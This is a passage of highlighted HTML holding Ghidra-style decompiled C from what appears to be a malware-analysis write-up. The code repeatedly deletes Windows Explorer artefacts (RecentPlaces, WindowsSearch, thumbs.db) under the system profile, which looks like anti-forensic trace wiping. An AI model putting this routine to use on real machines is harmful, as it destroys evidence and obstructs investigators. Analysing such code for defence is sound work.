style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Explorer\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">RecentPlaces\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                             );\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140003413\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                FUN_1400736b0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140003422\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                pcVar12 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">char\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#B392F0\">FUN_140031060\u003C/span>\u003Cspan style=\"color:#E1E4E8\">((undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x000001e0 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3));\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">14000342a\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                remove\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(pcVar12);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140003439\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                FUN_140073680\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140003459\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                FUN_1400a8620\u003C/span>\u003Cspan style=\"color:#E1E4E8\">((longlong \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x000001c0 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3),\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">                              \"C:\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Windows\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">System32\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">config\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">systemprofile\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">AppData\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Local\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Microso ft\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Windows\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Explorer\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">WindowsSearch\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                             );\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140003468\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                FUN_1400736b0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140003477\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                pcVar12 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">char\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#B392F0\">FUN_140031060\u003C/span>\u003Cspan style=\"color:#E1E4E8\">((undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x000001c0 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3));\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">14000347f\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                remove\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(pcVar12);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">14000348e\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                FUN_140073680\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">1400034ae\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                FUN_1400a8620\u003C/span>\u003Cspan style=\"color:#E1E4E8\">((longlong \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x000001a0 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3),\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">                              \"C:\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Windows\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">System32\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">config\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">systemprofile\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">AppData\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Local\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Microso ft\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Windows\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Explorer\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">WindowsSearch\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                             );\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">1400034bd\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                FUN_1400736b0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">1400034cc\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                pcVar12 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">char\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#B392F0\">FUN_140031060\u003C/span>\u003Cspan style=\"color:#E1E4E8\">((undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x000001a0 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3));\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">1400034d4\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                remove\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(pcVar12);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">1400034e3\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                FUN_140073680\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140003503\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                FUN_1400a8620\u003C/span>\u003Cspan style=\"color:#E1E4E8\">((longlong \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x00000180 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3),\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">                              \"C:\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Windows\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">System32\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">config\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">systemprofile\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">AppData\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Local\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Microso ft\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Windows\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Explorer\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">thumbs.db\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                             );\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140003512\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                FUN_1400736b0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140003521\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                pcVar12 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">char\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#B392F0\">FUN_140031060\u003C/span>\u003Cspan style=\"color:#E1E4E8\">((undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x00000180 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3));\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140003529\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                remove\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(pcVar12);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined1 \u003C/span>\u003Cspan style=\"color:#F97583\">**\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0xffffffffffffffe0 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                     &#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x00000178 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan 